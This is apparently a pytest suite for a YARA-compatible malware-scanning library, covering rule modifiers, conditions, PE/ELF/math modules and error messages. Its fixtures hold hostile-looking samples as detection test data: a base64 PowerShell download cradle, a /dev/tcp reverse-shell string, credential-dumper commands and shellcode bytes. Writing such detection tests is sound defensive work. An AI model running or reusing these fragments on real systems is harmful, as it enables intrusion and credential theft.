"""scan's YARA compatibility: modifiers (wide/nocase regexes, xor, base64), conditions (counts, offsets,
for-loops, arithmetic, undefined values), private/global rules, the pe/elf/math modules, a corpus of
realistic rules, and precise errors for what isn't supported. Expected behaviour follows the YARA
documentation (writingrules.html and the module pages)."""

import base64
import json
import random

import pytest

from binfixtures import build_cert, build_elf, build_pe, build_pkcs7
from conftest import ROOT, run_tb, tb_error

from tblib import scan

CORPUS = ROOT / "tests" / "lib" / "yara" / "corpus.yar"
ALWAYS = {"Global_Reasonable_Size"}


def q(text):
    return json.dumps(text)


def hits(rule_text, data):
    """Names of the rules in rule_text that match data (bytes or text)."""
    raw = data.encode("latin-1") if isinstance(data, str) else data
    return [m["rule"] for m in scan.scan_bytes(scan.parse_rules(rule_text), raw)]


def matches(strings, condition, data):
    return bool(hits(f"rule R {{ strings: {strings} condition: {condition} }}", data))


def corpus_hits(data):
    rules = scan.parse_rules(CORPUS.read_text())
    return set(m["rule"] for m in scan.scan_bytes(rules, data)) - ALWAYS


# -- the corpus ---------------------------------------------------------------------

def test_corpus_parses_through_tb():
    out = run_tb(f'import scan\nlet rules = scan.load("{str(CORPUS).replace(chr(92), "/")}")\n'
                 'say(len(rules))\nsay(rules.filter(fn(r) { return r.get("private", false) }).map(fn(r) { return r.name }))\n'
                 'say(rules[0].get("global", false), rules[3].tags)')
    assert out == ["34", '["IsPE", "IsELF"]', 'true ["powershell", "t1059_001"]']


RNG = random.Random(7)
NOISE = RNG.randbytes(30000)
SIGNED = build_pkcs7([build_cert([("CN", "Demo Signer")], [("CN", "Demo CA")], 0x1234)], ([("CN", "Demo CA")], 0x1234))
B64 = base64.b64encode(b"xIEX (New-Object Net.WebClient).DownloadString('http://x/a')").decode()
CUSTOM = b"ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/"
CUSTOM_B64 = base64.b64encode(b"..beacon_interval=60").translate(
    bytes.maketrans(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", CUSTOM))


@pytest.mark.parametrize("name,data,expected", ids=lambda v: v if isinstance(v, str) and len(v) < 40 else "", argvalues=[
    ("injector pe",
     build_pe(sections=[(".text", b"\x55\x8b\xec" + b"\x90" * 600, 0x60000020), ("UPX1", b"\x00" * 64, 0xE0000040)],
              imports={"KERNEL32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"],
                       "WS2_32.dll": [23, "connect"]}, rich=[(259, 30795, 10), (260, 30795, 2)]),
     {"MAL_PE_Known_Imphash", "SUSP_PE_UPX_Sections", "SUSP_PE_Writable_Code_Section", "SUSP_PE_Injection_Imports",
      "INFO_PE_Built_With_MSVC", "SUSP_PE_Entrypoint_Code", "SUSP_MZ_Header_Offsets", "SUSP_Arithmetic_And_Bits",
      "SUSP_Byte_Statistics", "SUSP_String_Operators", "SUSP_Defined_Fields"}),
    ("signed service dll", build_pe(dll=True, exports=["ServiceMain"], subsystem=2, signature=SIGNED),
     {"SUSP_PE_Service_DLL", "SUSP_PE_Signed_By_Demo_CA", "SUSP_PE_GUI_Without_Imports", "SUSP_PE_Entrypoint_Code",
      "SUSP_MZ_Header_Offsets", "SUSP_Arithmetic_And_Bits", "SUSP_Byte_Statistics", "SUSP_String_Operators",
      "SUSP_Defined_Fields"}),
    ("packed pe with overlay",
     build_pe(sections=[(".text", NOISE, 0x60000020)], imports={"KERNEL32.dll": ["LoadLibraryA"]}, overlay=NOISE),
     {"SUSP_PE_High_Entropy", "SUSP_PE_Large_Overlay", "SUSP_MZ_Header_Offsets", "SUSP_Arithmetic_And_Bits",
      "SUSP_String_Operators"}),
    ("reverse shell elf",
     build_elf(sections=[(".rodata", b"/bin/sh\x00/dev/tcp/203.0.113.5/4444\x00", 1, 2), (".text", b"\x90" * 32, 1, 6)],
               wx_segment=True),
     {"LNX_Reverse_Shell", "LNX_Writable_Executable_Segment", "SUSP_Arithmetic_And_Bits", "SUSP_Byte_Statistics"}),
    ("upx elf", build_elf(sections=[(".text", b"\x90" * 32, 1, 6), ("UPX0", b"\x00" * 16, 1, 2)]),
     {"LNX_UPX_Section_Name", "SUSP_Arithmetic_And_Bits", "SUSP_Byte_Statistics"}),
    ("encoded powershell", "powershell.exe -nop -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
     {"SUSP_PowerShell_EncodedCommand"}),
    ("encoded powershell (utf-16)",
     ("POWERSHELL -EncodedCommand " + "A" * 44).encode("utf-16-le"), {"SUSP_PowerShell_EncodedCommand"}),
    ("xor banner", bytes(b ^ 0x5A for b in b"This program cannot be run in DOS mode"), {"MAL_XOR_Encoded_DOS_Banner"}),
    ("plain banner is not xor(1-255)", b"This program cannot be run in DOS mode", set()),
    ("dumper words", "Privilege::Debug then SEKURLSA::LogonPasswords, lsadump::sam -- by the dumper team",
     {"HKTL_Credential_Dumper_Strings"}),
    ("dumper words, no fullword", "privilege::debug sekurlsa::logonpasswords lsadump::sam superdumpers", set()),
    ("base64 cradle", B64, {"SUSP_Base64_Download_Cradle"}),
    ("base64wide cradle", base64.b64encode(b"zzInvoke-Expression").decode().encode("utf-16-le"),
     {"SUSP_Base64_Download_Cradle"}),
    ("custom alphabet", CUSTOM_B64, {"SUSP_Custom_Base64_Alphabet"}),
    ("shellcode", b"\x00\xfc\xe8\x89\x00\x00\x00\x01\x02\x60\x89\xe5", {"APT_Shellcode_Hex_Patterns"}),
    ("peb access", b"\x90\x64\x8b\x35\x30\x00\x00\x00", {"APT_Shellcode_Hex_Patterns"}),
    ("nibbles and not-byte", b"MZ\x90\x00\x01\x02PE\x00\x00\x4c\x01", {"APT_Shellcode_Hex_Patterns",
                                                                       "SUSP_MZ_Header_Offsets"}),
    ("bare ip urls", " ".join(f"http://198.51.100.{i}/x" for i in range(4)), {"SUSP_Many_Bare_IP_URLs"}),
    ("three bare ip urls", " ".join(f"http://198.51.100.{i}/x" for i in range(3)), set()),
    ("ransom note", "All YOUR FILES HAVE BEEN ENCRYPTED. Pay in Bitcoin to decrypt.", {"SUSP_Ransom_Note"}),
    ("bitcoins is not the word", "your files have been encrypted, pay bitcoins to decrypt", set()),
    ("recon", 'whoami /all & IPCONFIG /all', {"SUSP_Half_Of_Recon_Commands"}),
    ("recon, one of four", "whoami /all", set()),
    ("shell names", "cmd.exe /c x & cmd.exe /c y", {"SUSP_Repeated_Shell_Names"}),
    ("script early", "<html><SCRIPT>eval(x)</script>", {"SUSP_Script_In_First_KB"}),
    ("script late", "x" * 1100 + "<script>", {"SUSP_Arithmetic_And_Bits"}),
    ("onion wide", "visit abcdefghijklmnop.onion now".encode("utf-16-le"), {"SUSP_Onion_Address_Wide"}),
    ("onion ascii is not wide", "visit abcdefghijklmnop.onion now", set()),
])
def test_corpus_matches(name, data, expected):
    raw = data.encode() if isinstance(data, str) else data
    assert corpus_hits(raw) == expected, name


def test_global_rule_gates_everything():
    rules = 'global rule Small { condition: filesize < 10 } rule Any { strings: $a = "x" condition: $a }'
    assert hits(rules, "x") == ["Small", "Any"]
    assert hits(rules, "x" * 20) == []


def test_private_rules_count_but_are_not_reported():
    rules = ('private rule HasMZ { condition: uint16(0) == 0x5A4D }\n'
             'rule Uses { strings: $a = "PE" condition: HasMZ and $a }')
    assert hits(rules, "MZ..PE") == ["Uses"]
    assert hits(rules, "ZM..PE") == []


# -- string matching semantics (YARA docs) -----------------------------------------

def test_matches_overlap_like_yara():
    # YARA reports a match at every offset: "aa" occurs 3 times in "aaaa".
    assert matches('$a = "aa"', "#a == 3", "aaaa")
    out = scan.scan_bytes(scan.parse_rules('rule R { strings: $a = "aa" condition: $a }'), b"aaaa")
    assert [s["offset"] for s in out[0]["strings"]] == [0, 1, 2]


def test_fullword_means_non_alphanumeric_neighbours():
    # The docs' example: "domain" fullword matches www.my-domain.com and www.domain.com, not www.mydomain.com.
    for text, hit in [("www.mydomain.com", False), ("www.my-domain.com", True), ("www.domain.com", True),
                      ("my_domain", True), ("domain2", False)]:
        assert matches('$a = "domain" fullword', "$a", text) == hit, text
    assert matches('$a = "domain" wide fullword', "$a", "my-domain!".encode("utf-16-le"))
    assert not matches('$a = "domain" wide fullword', "$a", "mydomain".encode("utf-16-le"))


def test_regex_dot_newline_wide_and_nocase():
    assert not matches("$r = /a.b/", "$r", "a\nb")
    assert matches("$r = /a.b/s", "$r", "a\nb")
    assert matches("$r = /ab+c/ wide", "$r", "xxABBC".lower().encode("utf-16-le"))
    assert not matches("$r = /ab+c/ wide", "$r", "abbc")
    assert matches("$r = /ab+c/ wide ascii", "$r", "abbc")
    assert matches("$r = /AB[a-z]{2}\\x41/ wide nocase", "$r", "abxya".encode("utf-16-le"))
    assert matches("$r = /^MZ/", "$r", "MZ\nMZ") and not matches("$r = /^MZ/", "$r", "\nMZ")
    assert not matches("$r = /end$/", "$r", "the end\n")
    assert matches("$r = /end$/", "$r", "the end")


def test_xor_modifier_follows_the_docs():
    text = b"This program cannot"
    keyed = bytes(b ^ 0x42 for b in text)
    assert matches('$x = "This program cannot" xor', "$x", text)            # plain xor includes key 0
    assert matches('$x = "This program cannot" xor', "$x", keyed)
    assert not matches('$x = "This program cannot" xor(0x01-0xff)', "$x", text)
    assert matches('$x = "This program cannot" xor(0x42)', "$x", keyed)
    assert not matches('$x = "This program cannot" xor(0x43)', "$x", keyed)
    wide_keyed = bytes(b ^ 0x10 for b in "This program cannot".encode("utf-16-le"))
    assert matches('$x = "This program cannot" xor wide', "$x", wide_keyed)


def test_base64_modifier_gives_the_documented_strings():
    # writingrules.html: these three strings are what "This program cannot" base64 searches for.
    assert scan.base64_variants(b"This program cannot") == [
        b"VGhpcyBwcm9ncmFtIGNhbm5vd", b"RoaXMgcHJvZ3JhbSBjYW5ub3", b"UaGlzIHByb2dyYW0gY2Fubm90"]
    for prefix in (b"", b"a", b"ab"):
        encoded = base64.b64encode(prefix + b"This program cannot be run")
        assert matches('$b = "This program cannot" base64', "$b", encoded), prefix
        assert matches('$b = "This program cannot" base64wide', "$b", encoded.decode().encode("utf-16-le"))
    assert not matches('$b = "This program cannot" base64', "$b", b"This program cannot")


def test_long_hex_jumps_are_chained():
    far = b"MZ" + b"\x01" * 5000 + b"PE\x00\x00"
    assert matches("$h = { 4D 5A [-] 50 45 00 00 }", "$h", far)
    assert matches("$h = { 4D 5A [4000-] 50 45 00 00 }", "$h", far)
    assert not matches("$h = { 4D 5A [6000-] 50 45 00 00 }", "$h", far)
    assert matches("$h = { 4D 5A [4990-5010] 50 45 }", "$h", far)
    assert not matches("$h = { 4D 5A [10-4000] 50 45 }", "$h", far)
    assert not matches("$h = { 50 45 [-] 4D 5A }", "$h", far)
    out = scan.scan_bytes(scan.parse_rules("rule R { strings: $h = { 4D 5A [-] 50 45 } condition: $h }"), far)
    assert (out[0]["strings"][0]["offset"], out[0]["strings"][0]["length"]) == (0, 5004)
    for bad, message in [("[-] 4D", "can't start with a jump"), ("4D [-]", "can't end with a jump")]:
        with pytest.raises(scan.RuleSyntax, match=message):
            scan.parse_rules(f"rule R {{ strings: $h = {{ {bad} }} condition: $h }}")


# -- conditions ------------------------------------------------------------------------

@pytest.mark.parametrize("cond,data,hit", [
    ("#a > 3", "x x x x", True),
    ("#a > 3", "x x x", False),
    ("@a[1] == 2", "..x.x", True),
    ("@a[2] == 4", "..x.x", True),
    ("!a[1] == 1", "x", True),
    ("@a[3] == 0", "x x", False),           # undefined: neither == ...
    ("not (@a[3] == 0)", "x x", False),     # ... nor its negation is true
    ("@a[3] != 0", "x x", False),
    ("uint16(0) == 0x5A4D", "MZ", True),
    ("uint16be(0) == 0x4D5A", "MZ", True),
    ("int8(0) == -1", b"\xff", True),
    ("uint32(filesize - 2) == 0", "MZ", False),
    ("uint32(filesize - 2) != 0", "MZ", False),
    ("filesize == 2", "MZ", True),
    ("filesize \\ 0 == 1 or true", "MZ", True),
    ("for any of ($a, $b) : ( $ at 0 )", "yx", True),
    ("for all of ($a, $b) : ( $ at 0 )", "yx", False),
    ("for all of them : ( # >= 1 )", "x y", True),
    ("for any i in (1..#a) : ( @a[i] == 4 )", "x x x", True),
    ("for all i in (1..#a) : ( @a[i] < 3 )", "x x x", False),
    ("for 2 i in (1..#a) : ( @a[i] < 3 )", "x x x", True),
    ("for none i in (1..#a) : ( @a[i] > 100 )", "x x x", True),
    ("for any i in (1, 3, 5) : ( i == 3 )", "", True),
    ("1 of them", "y", True),
    ("2 of ($a, $b)", "y", False),
    ("50% of them", "y", True),
    ("100% of them", "y", False),
    ("any of them at 1", ".x", True),
    ("all of them in (0..2)", "xy", True),
    ("#a in (0..3) == 2", "x x x", True),
    ("$a in (2..10)", "x.x", True),
    ("defined @a[1]", "x", True),
    ("defined @a[2]", "x", False),
    ("entrypoint == 0", "x", False),
])
def test_conditions(cond, data, hit):
    assert matches('$a = "x" $b = "y"', cond, data) == hit, cond


def test_entrypoint_and_module_fields_on_real_layouts():
    exe = build_pe()
    rule = 'import "pe" rule E { strings: $p = { 55 8B EC } condition: $p at entrypoint and $p at pe.entry_point }'
    assert hits(rule, exe) == ["E"]
    assert hits('rule N { condition: pe.number_of_sections == 3 and pe.machine == pe.MACHINE_AMD64 '
                'and pe.is_64bit() and not pe.is_32bit() and pe.image_base == 0x140000000 '
                'and pe.linker_version.major == 14 and pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_IMPORT].size == 0 '
                'and pe.section_index(".data") == 2 and pe.rva_to_offset(0x1000) == 0x200 }', exe) == ["N"]
    elf = build_elf()
    assert hits('rule L { condition: elf.machine == elf.EM_X86_64 and elf.type == elf.ET_EXEC '
                'and elf.number_of_segments == 4 and elf.dynamic_section_entries > 4 and '
                'for any d in elf.dynamic : ( d.type == elf.DT_NEEDED ) and '
                'for any s in elf.sections : ( s.name == ".text" and s.flags & elf.SHF_EXECINSTR ) }', elf) == ["L"]
    assert hits('rule L { strings: $e = { 55 48 89 E5 } condition: $e at elf.entry_point and $e at entrypoint }',
                elf) == ["L"]
    # On a file that isn't PE, pe fields are undefined: a test and its negation are both false.
    assert hits('rule U { condition: pe.number_of_sections == 0 or not (pe.number_of_sections == 0) }', b"text") == []
    assert hits('rule U { condition: not pe.is_pe }', b"text") == ["U"]


def test_math_module():
    data = bytes(range(256)) * 4
    assert hits('import "math" rule M { condition: math.entropy(0, filesize) == 8.0 and math.mean(0, filesize) == 127.5 '
                'and math.deviation(0, filesize, 127.5) == 64.0 and math.entropy("aaaa") == 0.0 '
                'and math.count(0x41, 0, 256) == 1 and math.percentage(0x41) == 4 \\ 1024.0 * 1 + 0.00390625 - 0.00390625 '
                'and math.max(3, 9) == 9 and math.min(3, 9) == 3 and math.abs(-4) == 4 and math.to_number(true) == 1 '
                'and math.in_range(5, 1, 9) and not math.in_range(10, 1, 9) and math.mode(0, 4) == 0 }', data) == ["M"]
    assert hits('rule Z { condition: math.entropy(5000, 10) >= 0 or not (math.entropy(5000, 10) >= 0) }', data) == []
    # All zeros: no variance (YARA's -100000 marker), and every point lands inside the circle, so the
    # pi estimate is 4 and monte_carlo_pi gives |4 - pi| / pi.
    flat = b"\x00" * 600
    assert hits('rule S { condition: math.serial_correlation(0, filesize) == -100000.0 '
                'and math.monte_carlo_pi(0, filesize) > 0.273 and math.monte_carlo_pi(0, filesize) < 0.274 }',
                flat) == ["S"]


def test_tb_rule_maps_get_the_new_modifiers():
    out = run_tb('import scan\nlet r = {"name": "M", "strings": {"x": {"text": "secret", "xor": [1, 255]}, '
                 '"b": {"text": "secret", "base64": true}}, "condition": "$x or $b"}\n'
                 'say(scan.check(r)[0].strings.map(fn(s) { return s.get("xor", s.get("base64")) }))\n'
                 'say(len(scan.bytes(b"\\x73\\x65\\x63\\x72\\x65\\x74", r)), len(scan.bytes("c2VjcmV0", r)))')
    assert out == ["[[1, 255], true]", "0 1"]


def test_anonymous_strings_report_as_dollar():
    found = scan.scan_bytes(scan.parse_rules('rule A { strings: $ = "one" $ = "two" condition: all of them }'),
                            b"one two")
    assert [s["name"] for s in found[0]["strings"]] == ["$", "$"]


# -- what isn't supported fails precisely ----------------------------------------------

UNSUPPORTED = [
    ('import "cuckoo"\nrule A { condition: true }', 'import "cuckoo" (line 1): TB\'s scan supports the YARA modules'),
    ('rule A { condition: hash.md5(0, filesize) == "x" }', "the YARA module 'hash' isn't supported"),
    ('rule A { condition: dotnet.version == "v4" }', "the YARA module 'dotnet' isn't supported"),
    ('include "other.yar"', 'include "other.yar" (line 1) isn\'t supported'),
    ('rule A { condition: pe.rich_signature.clear_data == "x" }',
     "pe.rich_signature.clear_data isn't supported by TB's scan. pe.rich_signature has: key, length, offset"),
    ('rule A { condition: elf.symtab[0].name == "main" }', "elf.symtab isn't supported by TB's scan"),
    ('rule A { condition: math.to_string(5) == "5" }', "math.to_string isn't supported by TB's scan"),
    ('rule A { condition: pe.imports("a", "b", "c") }', "pe.imports() takes 1 or 2 arguments, not 3"),
    ('rule A { condition: pe.number_of_sections.x }', "'.x' can only follow a module"),
    ('rule A { strings: $a = { 4D 5A } nocase condition: $a }', "hex strings only take 'private', not nocase"),
    ('rule A { strings: $a = /abc/ xor condition: $a }', 'xor only works on "text" strings, not regexes'),
    ('rule A { strings: $a = "abc" base64 fullword condition: $a }', "base64 can't be combined with fullword"),
    ('rule A { strings: $a = "abc" base64wide nocase condition: $a }', "base64wide can't be combined with nocase"),
    ('rule A { strings: $a = "abc" xor(0x10-0x01) condition: $a }', "between 0 and 255, low to high"),
    ('rule A { strings: $a = "abc" xor(0x10 condition: $a }', "xor takes a key or a range"),
    ('rule A { strings: $a = "abc" base64("short") condition: $a }', "alphabet must be exactly 64 characters"),
    ('rule A { strings: $a = "abc" nocase nocase condition: $a }', "has the 'nocase' modifier twice"),
    ('rule B { condition: true }\nrule A { condition: any of (B, C*) }', "sets of rules like 'any of (Rule1, Rule*)'"),
    ('rule A { condition: filename matches /evil/ }', "I don't know 'filename' in the condition"),
    ('rule A { condition: Undefined_Rule }', "I don't know 'Undefined_Rule'"),
    ('rule A { strings: $a = "C:\\Windows" condition: $a }', "'\\W' isn't an escape YARA knows"),
    ('rule A { strings: $a = "\\xZZ" condition: $a }', "needs two hex digits"),
    ('rule A { strings: $a = /a\\bc/ wide condition: $a }', "can't be used in a wide regex"),
    ('rule A {\n strings:\n  $a = "x"\n condition:\n  $a and\n  $b\n}', "uses $b but no such string is defined (line 6)"),
    ('rule A {\n condition:\n  uint16(0) == 0x5A4D and\n  @ == 3\n}', "(line 4)"),
    ('rule A { strings: $a = "x" condition: $ at 0 }', "a bare '$' only works inside 'for ... of"),
    ('rule A { strings: $a1 = "x" condition: $a* }', "$a* can only be used inside 'of (...)'"),
    ('rule A { condition: true }\nrule A { condition: true }', "rule A is defined twice (line 2)"),
    ('rule A { strings: $a = { 4D [5-2] 5A } condition: $a }', "the jump [5-2] is backwards"),
    ('rule A { strings: $a = /a(b/ condition: $a }', "has a broken pattern"),
    ('rule A { condition: 1 + }', "the condition ends too early"),
    ('rule A { condition: for any i in pe.number_of_sections : ( true ) }', "'for ... in' needs a range"),
    ('rule A { condition: "abc" }', None),  # a text value is fine (true), YARA allows it too
    ('rule A { condition: /abc/ }', "a /regex/ can only follow 'matches'"),
]


@pytest.mark.parametrize("text,message", UNSUPPORTED)
def test_unsupported_features_fail_precisely(text, message):
    if message is None:
        scan.parse_rules(text)
        return
    with pytest.raises(scan.RuleSyntax) as info:
        scan.parse_rules(text)
    assert message in str(info.value), str(info.value)


def test_errors_reach_tb_as_friendly_errors():
    msg = str(tb_error(f'import scan\nscan.rules({q(UNSUPPORTED[1][0])})'))
    assert "scan.rules() couldn't read that rule" in msg and "hash" in msg and "Traceback" not in msg
